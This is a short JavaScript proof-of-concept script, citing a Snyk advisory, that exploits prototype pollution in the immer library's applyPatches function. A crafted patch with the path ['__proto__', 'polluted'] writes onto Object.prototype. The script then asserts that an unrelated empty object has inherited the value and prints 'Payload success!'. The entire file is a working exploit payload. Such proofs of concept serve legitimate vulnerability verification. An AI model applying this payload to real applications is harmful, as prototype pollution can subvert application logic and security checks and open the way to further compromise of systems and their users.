//https://snyk.io/vuln/SNYK-JS-IMMER-1019369
const {applyPatches, enablePatches} = require("immer");
const assert = require('assert');

enablePatches();
let obj = {};
console.log("Before : " + obj.polluted);
applyPatches({}, [ { op: 'add', path: [ "__proto__", "polluted" ], value: "yes" } ]);
// applyPatches({}, [ { op: 'replace', path: [ "__proto__", "polluted" ], value: "yes" } ]);


console.log("After : " + obj.polluted);
assert(obj.polluted === "yes");
console.log("Payload success!")

